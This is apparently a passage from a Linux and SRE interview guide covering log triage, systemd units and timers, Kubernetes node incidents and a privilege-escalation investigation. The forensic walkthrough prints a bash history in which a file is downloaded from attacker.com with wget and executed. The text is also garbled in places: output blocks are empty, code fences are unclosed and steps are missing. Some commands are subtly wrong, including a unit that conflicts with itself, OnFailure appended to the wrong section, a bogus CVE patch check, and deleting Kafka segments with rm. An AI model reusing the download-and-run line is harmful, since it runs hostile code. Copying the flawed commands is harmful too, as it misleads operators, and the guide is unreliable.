2024-01-15T02:58:01.234Z ERROR [PaymentService] Transaction timeout: txid=TX-8923412 amount=150.00 currency=USD
2024-01-15T02:58:01.456Z ERROR [DatabasePool] Connection acquisition timeout after 5000ms pool=write

```

**Step 2: Extract the 03:00–04:00 window using grep (streaming)**

```bash
# grep streams — processes line by line, no memory buffer needed
time grep '^2024-01-15T03:' /var/log/app/incident-2024-01-15.log > /tmp/incident_03h.log
```

```
real    2m34.123s   # 2.5 minutes for 50GB — acceptable
```

```bash
wc -l /tmp/incident_03h.log
```

```
124382 /tmp/incident_03h.log
```

> **124,382 lines in the 1-hour window.** Much more manageable.

**Step 3: Count and rank error types**

```bash
# Extract just ERROR lines and count by error type (the bracketed service name)
grep '^2024-01-15T03:.*ERROR' /tmp/incident_03h.log | \
    grep -oP '\[.*?\]' | \          # Extract [ServiceName] 
    sort | uniq -c | sort -rn       # Count and sort
```

```
  89234 [PaymentService]
  34512 [DatabasePool]
  23421 [CircuitBreaker]
   8923 [KafkaConsumer]
   4512 [RedisClient]
    891 [MetricsExporter]
    234 [HealthCheck]
```

**Step 4: Find top 10 unique error messages**

```bash
# Extract the error message text after the service name
grep '^2024-01-15T03:.*ERROR' /tmp/incident_03h.log | \
    sed 's/^.*ERROR \[.*\] //' | \      # Remove timestamp and [Service]
    sed 's/txid=TX-[0-9]*/txid=TX-XXX/g' | \  # Normalize transaction IDs
    sed 's/amount=[0-9.]*/amount=N/g' | \       # Normalize amounts
    sort | uniq -c | sort -rn | head -10
```

```
  89234 Transaction timeout: txid=TX-XXX amount=N currency=USD
  34512 Connection acquisition timeout after 5000ms pool=write
  23421 Circuit OPEN for service: inventory-service failures=10
   8923 Consumer group lag exceeded threshold lag=45234 topic=payment-events
   4512 Redis connection refused host=redis-master.default.svc.cluster.local:6379
    891 Metrics push failed: connection refused prometheus-pushgateway:9091
    234 Health check response time exceeded SLO threshold=100ms actual=891ms
```

> **Root cause visible:** `PaymentService` timeouts (89k) caused by `DatabasePool` connection timeouts (34k). The database pool was exhausted, likely due to the inventory service being down (circuit breaker opened with 10 failures), causing transactions to queue and time out.

**Step 5: Time-series analysis — when did errors peak?**

```bash
# Count errors per minute in the 03:00 hour
grep '^2024-01-15T03:.*ERROR' /tmp/incident_03h.log | \
    cut -c1-16 | \           # Extract YYYY-MM-DDTHH:MM
    sort | uniq -c
```

```
      12 2024-01-15T03:00
      34 2024-01-15T03:01
    1234 2024-01-15T03:02
   12341 2024-01-15T03:03     # <-- Spike starts here
   23412 2024-01-15T03:04
   34512 2024-01-15T03:05
   31234 2024-01-15T03:06
   28912 2024-01-15T03:07
    4512 2024-01-15T03:08     # <-- Recovery starts
     891 2024-01-15T03:09
      45 2024-01-15T03:10
```

> **Error spike from 03:03 to 03:08 UTC** — 6-minute blast radius. Recovery started at 03:08. This matches a deployment event — check deployment history for 03:02-03:03.

**Step 6: Advanced — use awk for multi-field analysis**

```bash
# Extract slowest transactions (latency field)
grep 'latency=' /tmp/incident_03h.log | \
    awk -F'latency=' '{print $2}' | \    # Get text after latency=
    awk '{print $1}' | \                  # Get first word (the number)
    sed 's/ms//' | \                      # Remove 'ms' suffix
    sort -n | tail -10                    # Top 10 slowest
```

```
12341
14512
15234
18923
21234
28912
34512
45123
89234
123412
```

```bash
# Get the actual lines for the top slowest requests
grep 'latency=' /tmp/incident_03h.log | \
    awk -F'latency=' '{split($2,a," "); if(a[1]+0 > 50000) print}' | head -5
```

```

### Q: You need to parse a multi-line log file where each "record" spans 3 lines (exception with stack trace), and extract records where line 1 matches ERROR and line 2 contains a specific service name. How do you do this with shell tools?

**Answer:**

**Situation:** Java stack traces span multiple lines. You need to extract full 3-line exception records matching specific criteria.

**Step 1: Understand the data format**

```bash
head -12 /var/log/app/exceptions.log
```

```
2024-01-15T03:05:01.234Z ERROR Transaction processing failed
    at com.company.payment.PaymentService.process(PaymentService.java:234)
    Caused by: java.sql.SQLException: Connection timeout after 5000ms

2024-01-15T03:05:01.891Z ERROR Cache lookup failed
    at com.company.cache.RedisClient.get(RedisClient.java:89)

    at com.company.retry.RetryPolicy.execute(RetryPolicy.java:45)
    Details: attempt=3 maxAttempts=5 backoffMs=1000
```

**Step 2: Extract 3-line records matching criteria using awk**

```bash
# Extract records where line 1 has ERROR and line 3 has "SQLException"
awk '
    /^20.*ERROR/ {
        line1 = $0
        getline line2
        getline line3
        if (line3 ~ /SQLException/) {
            print "---"
            print line1
            print line2
            print line3
        }
    }
' /var/log/app/exceptions.log
```

```

```

**Step 3: Count by exception type using awk**

```bash
awk '
/^20.*ERROR/ {
    line1 = $0
    getline line2
    getline line3
    match(line3, /Caused by: ([^:]+):/, arr)
    if (arr[1]) exceptions[arr[1]]++
}
END {
    for (exc in exceptions) print exceptions[exc], exc
}
' /var/log/app/exceptions.log | sort -rn
```

```
891 java.sql.SQLException
234 redis.clients.jedis.exceptions.JedisConnectionException
45  java.net.SocketTimeoutException
12  java.lang.OutOfMemoryError
3   java.lang.NullPointerException
```

**Step 4: Using sed for multi-line pattern matching**

```bash
# Extract 3-line blocks where any line matches a pattern
# Using sed's N command to read multiple lines into pattern space
grep -n "ERROR" /var/log/app/exceptions.log | head -5
```

```bash
# Alternative: perl for complex multi-line matching
perl -0777 -ne '
    while (/^(\d{4}-\d{2}-\d{2}.*ERROR.*)\n(.*)\n(.*SQLException.*)/mg) {
        print "MATCH:\n$1\n$2\n$3\n\n"
    }
' /var/log/app/exceptions.log | head -30
```

## 8. Systemd & Services

---

### Q: A critical microservice's systemd unit keeps restarting every 30 seconds. How do you debug the failure cause, check journal logs properly, and fix the unit?

**Answer:**

**Situation:** `systemctl status payment-api` shows `(running) -> (failed) -> (activating)` cycle. On-call engineer needs to diagnose without `tail -f`.

**Step 1: Check service status in detail**

```bash
systemctl status payment-api.service
```

```

```

> **Key info:** Exit code 1 (FAILURE). Restart counter is at 7 (has restarted 7 times). The process dies immediately.

**Step 2: View recent journal logs for this unit**

```bash
# View logs since the last 3 restarts
journalctl -u payment-api.service -n 100 --no-pager
```

```

```

> **Root cause:** Cannot connect to database at `10.0.2.100:5432`. Application exits immediately if DB is unreachable at startup.

**Step 3: Check if this is a network/firewall issue**

```bash
# Test connectivity to the database
timeout 5 bash -c 'echo >/dev/tcp/10.0.2.100/5432' && echo "Port open" || echo "Port closed/timeout"
```

```
Port closed/timeout
```

```bash
# Check routing
ip route get 10.0.2.100
```

```
10.0.2.100 via 10.0.1.1 dev eth0 src 10.0.1.45 uid 0
    cache
```

```bash
# Check security group / iptables
iptables -L OUTPUT -n | grep 5432
# In AWS — check security group allows 5432 from this instance's SG
```

```bash
# Is postgres running on the target host?
# (If we have access to it)
ssh 10.0.2.100 "systemctl status postgresql"
```

```
● postgresql.service - PostgreSQL RDBMS
     Active: inactive (dead)
```

> **The PostgreSQL service is not running** on the database host. That's the actual root cause. But even after it's fixed, the payment-api service needs to be fixed to handle startup gracefully.

**Step 4: Fix the systemd unit for resilient startup**

### Q: You need to create a systemd timer (cron replacement) for a database cleanup job, ensure it runs only one instance at a time, and monitor it properly. How?

**Answer:**

**Situation:** Replacing a cron job that deletes records older than 30 days from PostgreSQL. The job can take up to 20 minutes. If two instances overlap, they corrupt data.

**Step 1: Create the service unit (the actual job)**

```bash
cat > /etc/systemd/system/db-cleanup.service << 'EOF'
[Unit]
Description=Database Cleanup - Remove records older than 30 days
Documentation=https://wiki.internal/db-cleanup
After=network-online.target
# Prevent concurrent execution — next timer fire is held until this finishes

[Service]
Type=oneshot              # Run once and exit (not a daemon)
User=db-cleanup
Group=db-cleanup

ExecStart=/opt/scripts/db-cleanup.sh

# Job-specific settings
TimeoutStartSec=1800      # Kill if running more than 30 minutes
Nice=10                   # Low CPU priority (background job)
IOSchedulingClass=idle    # Lowest I/O priority

# Security
NoNewPrivileges=yes
PrivateTmp=yes
ReadOnlyPaths=/etc /usr
ReadWritePaths=/var/log/db-cleanup

# Output to syslog with identifier
StandardOutput=journal
StandardError=journal
SyslogIdentifier=db-cleanup

[Install]
WantedBy=multi-user.target
EOF
```

**Step 2: Create the timer unit**

```bash
cat > /etc/systemd/system/db-cleanup.timer << 'EOF'
[Unit]
Description=Daily Database Cleanup Timer
Requires=db-cleanup.service   # Link to service

[Timer]
# Run at 2:30am every day
OnCalendar=*-*-* 02:30:00

# If system was down at 2:30am, run as soon as it comes back up
# within 5 minutes of boot (with randomized delay to avoid thundering herd)
Persistent=true
RandomizedDelaySec=5min

# Accuracy of the timer (default 1min — lower CPU wake overhead)
AccuracySec=1min

[Install]
WantedBy=timers.target
EOF
```

**Step 3: Enable and start the timer**

```bash
# Enable and start
systemctl daemon-reload
systemctl enable --now db-cleanup.timer

# Verify timer is registered
systemctl list-timers --all | grep db-cleanup
```

```
NEXT                         LEFT         LAST                         PASSED       UNIT                   ACTIVATES

```

**Step 4: Test and monitor**

```bash
# Run immediately for testing (does NOT reset timer schedule)
systemctl start db-cleanup.service

# Follow execution
journalctl -u db-cleanup.service -f
```

```

Jan 15 15:01:45 prod-host systemd[1]: Finished Database Cleanup - Remove records older than 30 days.
```

**Step 5: Verify concurrency prevention**

```bash
# systemd Type=oneshot + timer automatically prevents overlapping execution
# If timer fires while service is running, systemd queues it

# To explicitly prevent any overlap even from manual invocations:
# Add to [Unit] section of .service:
# Conflicts=db-cleanup.service  (prevents manual start while timer is running)

# Check if job is currently running
systemctl is-active db-cleanup.service
```

```
inactive
```

```bash
# Check last run result
systemctl show db-cleanup.service --property=Result
```

```
Result=success
```

**Step 6: Alert on failure — add OnFailure handler**

```bash
# Create a notification service for failures
cat > /etc/systemd/system/notify-failure@.service << 'EOF'
[Unit]
Description=Notify on service failure: %i

[Service]
Type=oneshot
ExecStart=/usr/local/bin/send-alert.sh "%i failed — check journalctl -u %i"
EOF

# Update db-cleanup.service to use it
cat >> /etc/systemd/system/db-cleanup.service << 'EOF'
OnFailure=notify-failure@%n.service
EOF

systemctl daemon-reload
```

## 9. Combined Multi-Domain Scenarios

---

### Q: A production Kubernetes node is exhibiting slow pod startup times (pods take 5+ minutes to become Ready). How do you diagnose across systemd, disk, network, and process layers simultaneously?

**Answer:**

**Situation:** After a node replacement, new pods are taking 5+ minutes to start instead of the usual 30 seconds. The node joined the cluster successfully. No obvious errors in Kubernetes events.

**Step 1: Establish a timeline with kubelet logs (systemd layer)**

```bash
# Check kubelet service status
systemctl status kubelet --full | head -30
```

```
● kubelet.service - kubelet: The Kubernetes Node Agent
     Active: active (running) since Mon 2024-01-15 10:00:01 UTC; 2h ago
```

```bash
# Look for slow operations in kubelet journal
journalctl -u kubelet --since "1h ago" | grep -E "slow|timeout|pull|took|seconds" | head -30
```

```
Jan 15 12:00:23 node-05 kubelet[1234]: I0115 12:00:23.412341] "Image pull" image="nginx:1.25" took="4m23.412s"
Jan 15 12:00:23 node-05 kubelet[1234]: I0115 12:00:23.412341] "Pulling image" image="redis:7.2" progress="Downloading layer sha256:abc123... 10MB/847MB"
Jan 15 12:01:45 node-05 kubelet[1234]: W0115 12:01:45.891234] "Container runtime operation took longer than expected" operationType="ImagePull" duration="1m23.456s"
```

> **Image pulls are taking 4+ minutes.** The issue is in the container image download layer — likely a network or disk I/O problem during image pull.

**Step 2: Check container runtime and disk (disk layer)**

```bash
# Check containerd status
systemctl status containerd

# Check disk I/O during a pull
iostat -xz 1 10 &   # Run in background
crictl pull nginx:latest  # Trigger a pull to observe I/O
```

```
Device            r/s     w/s     rkB/s     wkB/s  %util
nvme0n1          0.0    12.3      0.0     234.1     2.1
nvme0n1          0.0   891.2      0.0   98234.2    99.8    # <-- During pull
nvme0n1          0.0   823.4      0.0   89123.1    98.2
```

> **Disk is at 99% utilization during image pull.** But why would a network pull cause disk I/O saturation?

```bash
# Check available disk space on containerd's storage directory
df -h /var/lib/containerd
```

```
Filesystem      Size  Used Avail Use% Mounted on
/dev/nvme0n1p1   20G   19G  512M  97% /
```

> **The disk is 97% full!** When writing image layers, the OS must work hard to find free blocks on a near-full filesystem. Block allocation becomes slow, causing high I/O wait.

**Step 3: Identify disk space consumers**

```bash
# Find what's consuming the disk
du -sh /var/lib/containerd/* | sort -rh | head -10
```

```

```

**Step 5: Check ECR pull-through cache configuration (network + process layer)**

```bash
# If using ECR private registry, check pull-through cache
# Many EKS nodes pull from public.ecr.aws which may rate limit
journalctl -u kubelet --since "30min ago" | grep "rate limit\|pull.*429\|too many requests"
```

```
Jan 15 12:05:23 node-05 kubelet[1234]: E0115 12:05:23.123] "Failed to pull image" err="rpc error: code = Unknown desc = failed to pull ... 429 Too Many Requests"
```

> **Additional finding:** Rate limiting from public ECR! Docker Hub and public ECR limit unauthenticated pulls.

```bash
# Configure ECR pull-through cache to proxy public images
# In EKS, configure in the AWS console or via eksctl:
# Or configure containerd to authenticate with ECR for better rate limits
cat /etc/containerd/config.toml | grep -A 10 "registry"
```

**Root causes summary:**
1. Primary: Disk full (97%) causing slow layer writes during image pulls → Fixed by pruning old images
2. Secondary: ECR rate limiting for public images → Fix by configuring pull-through cache or private registry mirrors

**Prevention:**

```bash
# Set up automatic image garbage collection in kubelet
# In /etc/kubernetes/kubelet-config.yaml:
imageGCHighThresholdPercent: 85    # Start GC when image storage hits 85%
imageGCLowThresholdPercent: 80     # GC until storage drops to 80%
imageMinimumGCAge: 2m              # Don't GC images used less than 2 minutes ago

# Restart kubelet to apply
systemctl restart kubelet
```

### Q: Your EKS node has high load average, an SSH session hangs, a pod is stuck, and a critical service keeps crashing. How do you triage all of this simultaneously as the only engineer on-call?

**Answer:**

**Situation:** 3am. PagerDuty fires 4 simultaneous alerts:
1. `NodeLoadHigh: load=28 on node ip-10-0-1-45 (4 vCPUs)`
2. `PodStuck: payment-api-7f9d8b in Terminating for 20 minutes`
3. `ServiceDown: nginx reverse proxy returning 502`
4. SSH to the node is extremely slow

**SRE triage principle: Stabilize → Diagnose → Fix → Prevent**

**Step 1: Establish connectivity (SSH is slow — not dead)**

```bash
# SSH with a long timeout and compression
ssh -o ConnectTimeout=120 -o ServerAliveInterval=10 -C ec2-user@10.0.1.45

# If SSH is completely blocked, use AWS SSM Session Manager as backup
aws ssm start-session --target i-0abc1234567890def --region ap-south-1
```

```
Starting session with SessionId: admin-0abc1234567890
sh-4.2$
```

> Got in via SSM. Node is responsive but under severe load.

**Step 2: Quick situational awareness (30-second triage)**

```bash
# Single command to get full picture
uptime; echo "---"; top -b -n 1 | head -20; echo "---"; df -h; echo "---"; free -h
```

```

```

> **28-second triage result:**
> - **Load=28** with 27.2% `wa` (I/O wait) — disk I/O is the root cause of load
> - **`/data` is 100% full** — this is likely causing everything else
> - **Memory nearly exhausted** — 128 MiB free with no swap → OOM territory
> - **CPU 58% sy (system)** — kernel is spending most time on syscalls, probably disk I/O syscalls

**Step 3: Confirm the disk full is root cause**

```bash
# Check what's filling /data
du -sh /data/* 2>/dev/null | sort -rh | head -10
```

```
48G     /data/kafka-logs
1.2G    /data/app-logs

```bash
# Kafka logs — check retention config
ls -lt /data/kafka-logs/ | head -20
```

```

```

> **Kafka is filling the disk.** Log retention is not cleaning up old segments fast enough.

**Step 4: Emergency disk recovery (fix the root cause)**

```bash
# Check Kafka retention settings
grep -i "retention\|segment" /etc/kafka/server.properties | grep -v "^#"
```

```
log.retention.hours=168           # 7 days retention
log.segment.bytes=1073741824      # 1GB segment size
log.retention.check.interval.ms=300000  # Check every 5 minutes
```

```bash
# Force Kafka to trigger log cleanup immediately
# Send SIGTERM to trigger controlled shutdown (unsafe mid-incident)
# SAFER: Use Kafka admin tools to reduce retention temporarily

# Kafka admin - reduce retention to 1 hour temporarily

```bash
# Safe to remove old segments (consumers are at log-end)
# First the oldest log segments
ls -t /data/kafka-logs/payment-events-0/*.log | tail -5 | xargs rm -v

/dev/nvme0n2     50G   38G   12G  76% /data   # Recovered 12GB
```

**Step 5: Address the stuck pod (now that disk pressure is reduced)**

```bash
# Check the stuck pod
kubectl describe pod payment-api-7f9d8b | grep -A 5 "Events:"
```

```
Events:
  Warning  FailedKillPod  20m   kubelet  error killing pod: failed to "StopContainer" for "payment-api" with StopContainerError: rpc error: context deadline exceeded
```

> **Container failed to stop** — likely because it was waiting for a slow disk operation (which just got fixed).

```bash
# The containerd runtime may have timed out. Check containerd
systemctl status containerd
```

```
● containerd.service - containerd container runtime
     Active: active (running) but degraded
     ...
     Warning: containerd: operation timed out, possible disk full condition
```

```bash
# Restart containerd to clear stuck state
systemctl restart containerd

# Now force-delete the pod
kubectl delete pod payment-api-7f9d8b --grace-period=0 --force
```

```
Warning: Immediate deletion does not wait for confirmation that the running resource has been terminated.
pod "payment-api-7f9d8b" force deleted
```

**Step 6: Fix the nginx 502 (service layer)**

```bash
# nginx returning 502 = upstream (backend pods) not responding
journalctl -u nginx --since "30min ago" | grep -E "502|upstream|connect" | tail -10
```

```
Jan 15 03:02:34 prod-host nginx[1234]: 2024/01/15 03:02:34 [error] connect() failed (111: Connection refused) while connecting to upstream, upstream: "http://10.0.1.100:8080/api/"
Jan 15 03:02:34 prod-host nginx[1234]: *12341 recv() failed (104: Connection reset by peer) while reading response header from upstream
```

```bash
# Check if the payment-api pod (which nginx proxies) is running
kubectl get pods -l app=payment-api
```

```
NAME                   READY   STATUS    RESTARTS   AGE
payment-api-7f9d8b     0/1     Pending   0          1m   # <-- Just deleted and restarting
```

```bash
# Pod is restarting after our force-delete. Wait for it
kubectl wait --for=condition=Ready pod -l app=payment-api --timeout=120s
```

```
pod/payment-api-8a9b0c condition met
```

```bash
# Test nginx
curl -s -o /dev/null -w "%{http_code}" http://localhost/api/health
```

```
200
```

> **All services recovered.** Total time: ~18 minutes from first alert.

**Post-incident actions:**

```bash
# 1. Create Kafka disk usage alert at 70%
# 2. Configure log retention properly
echo "log.retention.bytes=42949672960" >> /etc/kafka/server.properties  # 40GB limit
echo "log.retention.hours=72" >> /etc/kafka/server.properties           # 3 day limit
systemctl reload kafka

# 3. Add /data monitoring to Prometheus
cat >> /etc/prometheus/node-exporter-textfile/*.prom << 'EOF'
# HELP node_filesystem_critical Filesystem critically full
# TYPE node_filesystem_critical gauge
node_filesystem_critical{mountpoint="/data"} 0
EOF

# 4. Document runbook and timeline for the incident report
journalctl --since "2024-01-15 03:00" --until "2024-01-15 03:30" > /tmp/incident_journal.log
```

### Q: You need to investigate a suspected privilege escalation attempt on a production host. A regular user's process is running as root. Trace the entire chain from permissions through process tree through filesystem.

**Answer:**

**Situation:** Security monitoring alerts that user `appuser` has a process running as root. This should be impossible — `appuser` has no sudo rights.

**Step 1: Identify the suspicious process**

```bash
# Find processes owned by root but started by appuser
ps -eo pid,ppid,uid,euid,user,comm,args | awk '$3 != $4 && $4 == 0 {print}'
```

```
  PID  PPID  UID EUID USER     COMM            ARGS
28912 28891 1001    0 root     bash            bash
```

> `UID=1001` (appuser's UID) but `EUID=0` (effective UID = root). This process was launched by `appuser` but is executing as root.

**Step 2: Trace the process chain**

```bash
# Get full process tree
pstree -p -u 28891
```

```
appuser(28891)---bash(28912,root)
```

```bash
# Check parent process
ps -o pid,ppid,uid,euid,user,comm,args -p 28891
```

```
  PID  PPID  UID EUID USER     COMM    ARGS
28891 28841 1001 1001 appuser  bash    /bin/bash
```

```bash
# Check grandparent
ps -o pid,ppid,uid,euid,user,comm,args -p 28841
```

```
  PID  PPID  UID EUID USER     COMM    ARGS
28841 1234 1001 1001 appuser  sshd    sshd: appuser@pts/2
```

> The chain: `sshd` (normal login) → `appuser bash` (normal user shell) → `root bash` (suspicious!)

**Step 3: Find how appuser escalated**

```bash
# Check what command was run just before the root shell
# Read bash history for appuser
cat /home/appuser/.bash_history | tail -20
```

```
ls /tmp
wget http://attacker.com/exploit -O /tmp/.x
chmod +x /tmp/.x
/tmp/.x
id
whoami
```

> **Downloaded and executed a file from an external URL.** This is the escalation vector.

**Step 4: Investigate the exploit binary**

```bash
# Check the binary
file /tmp/.x 2>/dev/null || echo "File deleted"
```

```
File deleted
```

```bash
# Check if it's still in /proc (process might still reference it)
ls -la /proc/28912/exe
```

```
lrwxrwxrwx 1 root root 0 Jan 15 14:23 /proc/28912/exe -> /tmp/.x (deleted)
```

```bash
# Copy the deleted binary from /proc before the process ends
cp /proc/28912/exe /tmp/exploit_sample
file /tmp/exploit_sample
```

```
/tmp/exploit_sample: ELF 64-bit LSB executable, x86-64, statically linked, stripped
```

```bash
strings /tmp/exploit_sample | grep -E "setuid|ptrace|/proc|cred|capability"
```

```
ptrace_attach
/proc/1/mem
commit_creds
prepare_kernel_cred
/proc/self/status
```

> **Kernel exploit.** This binary uses `ptrace` to attach to a privileged process and manipulate kernel credentials (`commit_creds`/`prepare_kernel_cred`) — a classic **dirty COW or similar kernel LPE** pattern.

**Step 5: Check kernel version (is it vulnerable?)**

```bash
uname -r
```

```
5.4.0-1089-aws
```

```bash
# Check CVE databases for this kernel version
# Known LPE vulns: CVE-2022-0847 (dirty pipe), CVE-2016-5195 (dirty cow)
# Check if kernel has the dirty pipe fix
grep -r "dirty.pipe\|CVE-2022-0847" /proc/sys/kernel/ 2>/dev/null || echo "Not patched"
```

**Step 6: Immediate containment**

```bash
# 1. Kill the root shell immediately
kill -9 28912

# 2. Lock appuser account
usermod -L appuser
passwd -l appuser

# 3. Check what damage was done while root
# Check for new SUID files, cron jobs, users, SSH keys
find / -newer /tmp/.x -perm /4000 -type f 2>/dev/null | grep -v /proc
grep "appuser\|new_user" /var/log/auth.log | grep "useradd\|usermod" | tail -20
cat /root/.ssh/authorized_keys
crontab -l -u root

# 4. Isolate the node from the network (AWS: modify security group)
# Remove all inbound rules except from your IP for emergency access

# 5. Preserve forensic evidence
tar -czf /secure/forensics-$(date +%Y%m%d-%H%M%S).tar.gz \
    /var/log/auth.log \
    /home/appuser/.bash_history \
    /tmp/exploit_sample \
    /proc/28912/ 2>/dev/null
```

**Step 7: Patch the kernel**

```bash
# Check available kernel updates
apt-get update && apt-cache show linux-image-aws | grep Version | head -3

# Schedule kernel update during maintenance window
# For EKS nodes: drain the node, update kernel, reboot, uncordon
kubectl drain node-05 --ignore-daemonsets --delete-emptydir-data
apt-get install -y linux-image-5.15.0-1045-aws
reboot
```
